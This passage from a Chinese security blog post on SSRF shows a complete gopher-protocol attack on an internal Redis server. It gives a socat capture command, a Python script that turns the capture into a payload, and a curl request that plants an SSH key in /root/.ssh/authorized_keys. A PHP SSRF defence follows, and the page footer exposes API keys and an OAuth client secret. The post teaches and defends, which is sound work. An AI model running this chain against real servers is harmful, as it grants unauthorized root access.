+<p>关于脚本的解释可以看<a href="http://anemone.top/%E7%BB%84%E4%BB%B6-redis%E6%9C%AA%E6%8E%88%E6%9D%83-%E5%BC%B1%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E9%98%B2%E6%8A%A4/">redis未授权&amp;弱密码漏洞复现和防护</a></p>
+<p>拦截6379的数据包：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -v tcp-listen:4444,fork tcp-connect:192.168.70.128:6379 2&gt;&amp;1|tee socat.log</span><br></pre></td></tr></table></figure>
+<p>执行脚本，将攻击流量打到测试机器上：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash shell.sh 127.0.0.1 4444</span><br></pre></td></tr></table></figure>
+<p><img src="/ssrf-SSRF成因、攻击和防御/1549458278181.png" alt="1549458278181"></p>
+<p>这时socat那看到攻击流量：</p>
+<p><img src="/ssrf-SSRF成因、攻击和防御/1549458694665.png" alt="1549458694665"></p>
+<p>使用脚本将攻击流量转换为gopher协议，先来了解一下socat日志记录tcp流的格式：</p>
+<ul>
+<li><p><code>&lt;</code>开头一行表示客户端发送来了一个tcp包，下面为包内容，如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; 2019/02/06 21:58:17.968244  length=51 from=0 to=50</span><br><span class="line">*4\r</span><br><span class="line">$6\r</span><br><span class="line">config\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$3\r</span><br><span class="line">dir\r</span><br><span class="line">$10\r</span><br><span class="line">/root/.ssh\r</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>&gt;</code>开头一行表示服务器返回一个tcp包，下面为包内容，如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt; 2019/02/06 21:58:17.981363  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>基于以上格式，将客户端发送的tcp包转换为payload：</p>
+<ul>
+<li>将\r字符串替换成%0d%0a</li>
+<li>空白行替换为%0a</li>
+<li>空格替换成%20</li>
+<li>再使用urlencode（给php时会做一次decode，curl再做一次decode）</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">exp = <span class="string">''</span></span><br><span class="line">socat_file=sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="comment">#  socat_file='./socat.log'</span></span><br><span class="line"></span><br><span class="line">client_tcp=<span class="literal">True</span></span><br><span class="line"><span class="keyword">with</span> open(socat_file) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> line.startswith(<span class="string">'&gt;'</span>):</span><br><span class="line">            client_tcp=<span class="literal">True</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line.startswith(<span class="string">'&lt;'</span>):</span><br><span class="line">            client_tcp=<span class="literal">False</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> client_tcp:</span><br><span class="line">            <span class="comment"># 判断倒数第2、3字符串是否为\r</span></span><br><span class="line">            <span class="keyword">if</span> line[<span class="number">-3</span>:<span class="number">-1</span>] == <span class="string">r'\r'</span>:</span><br><span class="line">               <span class="comment"># 如果该行只有\r，将\r替换成%0a%0d%0a</span></span><br><span class="line">               <span class="keyword">if</span> len(line) == <span class="number">3</span>:</span><br><span class="line">                   exp = exp + <span class="string">'%0a%0d%0a'</span></span><br><span class="line">               <span class="keyword">else</span>:</span><br><span class="line">                   line = line.replace(<span class="string">r'\r'</span>, <span class="string">'%0d%0a'</span>)</span><br><span class="line">                   <span class="comment"># 去掉最后的换行符</span></span><br><span class="line">                   line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">                   exp = exp + line</span><br><span class="line">            <span class="comment"># 判断是否是空行，空行替换为%0a</span></span><br><span class="line">            <span class="keyword">elif</span> line == <span class="string">'\x0a'</span>:</span><br><span class="line">               exp = exp + <span class="string">'%0a'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">               line = line.replace(<span class="string">' '</span>, <span class="string">'%20'</span>)</span><br><span class="line">               line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">               exp = exp + line</span><br><span class="line">exp=quote(exp)</span><br><span class="line">print(exp)</span><br></pre></td></tr></table></figure>
+<p>使用脚本生成payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python socat2gopher.py socat.log</span><br></pre></td></tr></table></figure>
+<p><img src="/ssrf-SSRF成因、攻击和防御/1549509311002.png" alt="1549509311002"></p>
+<p>将exp用gopher协议发送（这里的192.168.70.128:6379是受害者内网的redis服务器）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v <span class="string">'http://127.0.0.1/ssrf.php?url=gopher://192.168.70.129:6379/_%2A3%250d%250a%243%250d%250aset%250d%250a%243%250d%250atmp%250d%250a%24413%250d%250a%250a%250a%250a%250assh-rsa%2520AAAAB3NzaC1yc2EAAAADAQABAAABAQDNPLyFJPazctB0%2BJAWQ8%2B5pNIOlGMYLmTupLXT5EjFkEDzKhkGu8l%2BC4ja/s4IIoMBtoxDPcogMLRFtxWv%2BA6WIvFQhAsqcaDBl48mXmsiHtKJbooNLplu/fTvdSjisnaF8Qsa/zRSWubPSfzzz5ObhsLhpXD/hcMofUZxofbysT0yWhmlTdC7i2GDIxlZPlSdpAxwPo0BgaP5GO/6GQ49GC4niw5j2UTAqBDQWqwWww5yxNXU/iY9YY83MUbMpuUlLgmpne1lFhY2jQ69uPiVPKUWWHPcNHgIeNqVAoTCFXSvjVgnDu/iHQSkm0o0uW/who12xgxAOXm3MU1cX9gL%2520anemone%40DESKTOP-ANEMONE%250a%250a%250a%250a%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2410%250d%250a/root/.ssh%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%2415%250d%250aauthorized_keys%250d%250a%2A2%250d%250a%243%250d%250aget%250d%250a%243%250d%250atmp%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a'</span></span><br></pre></td></tr></table></figure>
+<p>返回5个<code>+OK</code>表示写入成功：</p>
+<p><img src="/ssrf-SSRF成因、攻击和防御/1549509436064.png" alt="1549509436064"></p>
+<p>可以看到远程服务器上的公钥已经写入：</p>
+<p><img src="/ssrf-SSRF成因、攻击和防御/1549459966337.png" alt="1549459966337"></p>
+<p>ssh可以登录：</p>
+<p><img src="/ssrf-SSRF成因、攻击和防御/1549459989638.png" alt="1549459989638"></p>
+<h1 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h1><p>考虑到以上的各种绕过，产生如下基本思路（参考p神的<a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html" target="_blank" rel="noopener">谈一谈如何在Python开发中拒绝SSRF漏洞</a>）：</p>
+<ol>
+<li><p><strong>只允许http或https协议</strong></p>
+</li>
+<li><p>解析目标URL，获取其host</p>
+</li>
+<li><p>解析host，获取host指向的IP地址转换成long型</p>
+</li>
+<li><p><strong>检查IP地址是否为内网IP</strong></p>
+</li>
+<li><p>请求URL</p>
+</li>
+<li><p>如果有跳转，拿出跳转URL，执行1(或者直接进用302跳转)，否则返回页面结果</p>
+</li>
+</ol>
+<p>参考<a href="https://www.jianshu.com/p/6ea9b8652d73" target="_blank" rel="noopener">PHP开发中防御SSRF</a>给出php的实现（Python实现请看<a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html" target="_blank" rel="noopener">谈一谈如何在Python开发中拒绝SSRF漏洞</a>）<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">    $ch = CURL_INIT();</span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_HEADER, <span class="keyword">FALSE</span>);</span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">TRUE</span>);</span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">FALSE</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">        <span class="comment">// 0.判断URL合法性</span></span><br><span class="line">        <span class="keyword">if</span> (!$url || !filter_var($url, FILTER_VALIDATE_URL, FILTER_FLAG_PATH_REQUIRED &amp; FILTER_FLAG_HOST_REQUIRED &amp; FILTER_FLAG_QUERY_REQUIRED))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.仅允许http或https协议</span></span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^https?:\/\/.*$/'</span>, $url))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.解析目标URL，获取其host</span></span><br><span class="line">        $host = parse_url($url, PHP_URL_HOST);</span><br><span class="line">        <span class="keyword">if</span>(!$host)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.解析host，获取host指向的IP地址</span></span><br><span class="line">        $ip = gethostbyname($host);</span><br><span class="line">        $ip = ip2long($ip);</span><br><span class="line">        <span class="keyword">if</span>($ip === <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4.检查IP地址是否为内网IP</span></span><br><span class="line">        $is_inner_ipaddress = ip2long(<span class="string">'127.0.0.0'</span>) &gt;&gt; <span class="number">24</span> == $ip &gt;&gt; <span class="number">24</span> <span class="keyword">or</span></span><br><span class="line">            ip2long(<span class="string">'10.0.0.0'</span>) &gt;&gt; <span class="number">24</span> == $ip &gt;&gt; <span class="number">24</span> <span class="keyword">or</span></span><br><span class="line">            ip2long(<span class="string">'172.16.0.0'</span>) &gt;&gt; <span class="number">20</span> == $ip &gt;&gt; <span class="number">20</span> <span class="keyword">or</span></span><br><span class="line">            ip2long(<span class="string">'192.168.0.0'</span>) &gt;&gt; <span class="number">16</span> == $ip &gt;&gt; <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">if</span>($is_inner_ipaddress)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5.请求URL</span></span><br><span class="line">        CURL_SETOPT($ch, CURLOPT_URL, $url);</span><br><span class="line">        $res = CURL_EXEC($ch);</span><br><span class="line">        $code = curl_getinfo($ch,CURLINFO_HTTP_CODE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6.如果有跳转，获取跳转URL执行1, 否则返回响应</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">300</span>&lt;=$code <span class="keyword">and</span> $code&lt;<span class="number">400</span>)&#123;</span><br><span class="line">            $headers = curl_getinfo($ch);</span><br><span class="line">            $url=$headers[<span class="string">"redirect_url"</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            CURL_CLOSE($ch) ;</span><br><span class="line">            <span class="keyword">return</span> $res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">    <span class="comment">// $url="http://localhost:8888/302.php";</span></span><br><span class="line">    $res=safe_request($url);</span><br><span class="line">    <span class="keyword">if</span>($res)</span><br><span class="line">        <span class="keyword">echo</span> var_dump($res);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
+<li>SSRF漏洞分析与利用，<a href="http://www.91ri.org/17111.html" target="_blank" rel="noopener">http://www.91ri.org/17111.html</a></li>
+<li>SSRF漏洞(原理&amp;绕过姿势)，<a href="https://www.t00ls.net/articles-41070.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-41070.html</a></li>
+<li>SSRF Tips，<a href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/" target="_blank" rel="noopener">http://blog.safebuff.com/2016/07/03/SSRF-Tips/</a></li>
+<li>谈一谈如何在Python开发中拒绝SSRF漏洞，<a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html" target="_blank" rel="noopener">https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html</a></li>
+<li>PHP开发中防御SSRF，<a href="https://www.jianshu.com/p/6ea9b8652d73" target="_blank" rel="noopener">https://www.jianshu.com/p/6ea9b8652d73</a></li>
+<li>SSRF in the Wild, <a href="https://medium.com/swlh/ssrf-in-the-wild-e2c598900434" target="_blank" rel="noopener">https://medium.com/swlh/ssrf-in-the-wild-e2c598900434</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+      
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Anemone</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://anemone.top/ssrf-SSRF成因、攻击和防御/" title="SSRF成因、利用和防御">http://anemone.top/ssrf-SSRF成因、攻击和防御/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+</div>
+
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/PHP/" rel="tag"># PHP</a>
+            
+              <a href="/tags/SSRF/" rel="tag"># SSRF</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/csrf-CSRF成因、攻击和防御/" rel="next" title="CSRF成因、攻击和防御">
+                  <i class="fa fa-chevron-left"></i> CSRF成因、攻击和防御
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/php-文件包含利用/" rel="prev" title="文件包含漏洞利用">
+                  文件包含漏洞利用 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF成因"><span class="nav-number">1.</span> <span class="nav-text">SSRF成因</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用方式"><span class="nav-number">2.</span> <span class="nav-text">利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#可利用的协议"><span class="nav-number">2.1.</span> <span class="nav-text">可利用的协议</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#绕过方式"><span class="nav-number">3.</span> <span class="nav-text">绕过方式</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过IP限制"><span class="nav-number">3.1.</span> <span class="nav-text">绕过IP限制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#十六进制IP"><span class="nav-number">3.1.1.</span> <span class="nav-text">十六进制IP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#十进制IP"><span class="nav-number">3.1.2.</span> <span class="nav-text">十进制IP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#八进制IP"><span class="nav-number">3.1.3.</span> <span class="nav-text">八进制IP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过Domain限制"><span class="nav-number">3.2.</span> <span class="nav-text">绕过Domain限制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xip-io"><span class="nav-number">3.2.1.</span> <span class="nav-text">xip.io</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nip-io"><span class="nav-number">3.2.2.</span> <span class="nav-text">nip.io</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#特殊字母"><span class="nav-number">3.2.3.</span> <span class="nav-text">特殊字母</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP-基础认证"><span class="nav-number">3.2.4.</span> <span class="nav-text">HTTP 基础认证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DNS-Rebinding"><span class="nav-number">3.2.5.</span> <span class="nav-text">DNS Rebinding</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过协议限制"><span class="nav-number">3.3.</span> <span class="nav-text">绕过协议限制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#302跳转"><span class="nav-number">3.3.1.</span> <span class="nav-text">302跳转</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用-0d-0a-r-n"><span class="nav-number">3.3.2.</span> <span class="nav-text">使用%0d%0a(\r\n)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Gopher利用Redis示例"><span class="nav-number">3.4.</span> <span class="nav-text">Gopher利用Redis示例</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#防御措施"><span class="nav-number">4.</span> <span class="nav-text">防御措施</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考链接"><span class="nav-number">5.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.jpg"
+      alt="Anemone">
+  <p class="site-author-name" itemprop="name">Anemone</p>
+  <div class="site-description" itemprop="description">关注Web安全、移动安全、Fuzz测试和机器学习</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">70</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/anemone95" title="GitHub &rarr; https://github.com/anemone95" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="mailto:anemone95@qq.com" title="E-Mail &rarr; mailto:anemone95@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2022</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">anemone</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.4.0</div>
+
+        
+
+
+
+
+
+
+  
+  <script>
+  function leancloudSelector(url) {
+    return document.getElementById(url).querySelector('.leancloud-visitors-count');
+  }
+  if (CONFIG.page.isPost) {
+    function addCount(Counter) {
+      var visitors = document.querySelector('.leancloud_visitors');
+      var url = visitors.getAttribute('id').trim();
+      var title = visitors.getAttribute('data-flag-title').trim();
+
+      Counter('get', `/classes/Counter?where=${JSON.stringify({ url })}`)
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length > 0) {
+            var counter = results[0];
+            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
+              .then(response => response.json())
+              .then(() => {
+                leancloudSelector(url).innerText = counter.time + 1;
+              })
+            
+              .catch(error => {
+                console.log('Failed to save visitor count', error);
+              })
+          } else {
+              Counter('post', '/classes/Counter', { title: title, url: url, time: 1 })
+                .then(response => response.json())
+                .then(() => {
+                  leancloudSelector(url).innerText = 1;
+                })
+                .catch(error => {
+                  console.log('Failed to create', error);
+                });
+            
+          }
+        })
+        .catch(error => {
+          console.log('LeanCloud Counter Error', error);
+        });
+    }
+  } else {
+    function showTime(Counter) {
+      var visitors = document.querySelectorAll('.leancloud_visitors');
+      var entries = [...visitors].map(element => {
+        return element.getAttribute('id').trim();
+      });
+
+      Counter('get', `/classes/Counter?where=${JSON.stringify({ url: { '$in': entries } })}`)
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length === 0) {
+            document.querySelectorAll('.leancloud_visitors .leancloud-visitors-count').forEach(element => {
+              element.innerText = 0;
+            });
+            return;
+          }
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.url;
+            var time = item.time;
+            leancloudSelector(url).innerText = time;
+          }
+          for (var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = leancloudSelector(url);
+            if (element.innerText == '') {
+              element.innerText = 0;
+            }
+          }
+        })
+        .catch(error => {
+          console.log('LeanCloud Counter Error', error);
+        });
+    }
+  }
+
+  fetch('https://app-router.leancloud.cn/2/route?appId=o5UaCJdPfEG0g7MVxXSMagpT-gzGzoHsz')
+    .then(response => response.json())
+    .then(({ api_server }) => {
+      var Counter = (method, url, data) => {
+        return fetch(`https://${api_server}/1.1${url}`, {
+          method: method,
+          headers: {
+            'X-LC-Id': 'o5UaCJdPfEG0g7MVxXSMagpT-gzGzoHsz',
+            'X-LC-Key': 'c6IN1PuMV3QPltJcrHfn74Gt',
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      if (CONFIG.page.isPost) {
+        const localhost = /http:\/\/(localhost|127.0.0.1|0.0.0.0)/;
+        if (localhost.test(document.URL)) return;
+        addCount(Counter);
+      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.1.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.ui.min.js"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css">
+<script src="//cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.js"></script><script src="/js/algolia-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+<script>
+if (document.querySelectorAll('pre.mermaid').length) {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
+    mermaid.initialize({
+      theme: 'forest',
+      logLevel: 3,
+      flowchart: { curve: 'linear' },
+      gantt: { axisFormat: '%m/%d/%Y' },
+      sequence: { actorMargin: 50 }
+    });
+  }, window.mermaid);
+}
+</script>
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID: 'f3075553d7b0225df6ca',
+      clientSecret: '68362ba87c4cc8e13103afcf729f5bd8ea176a78',
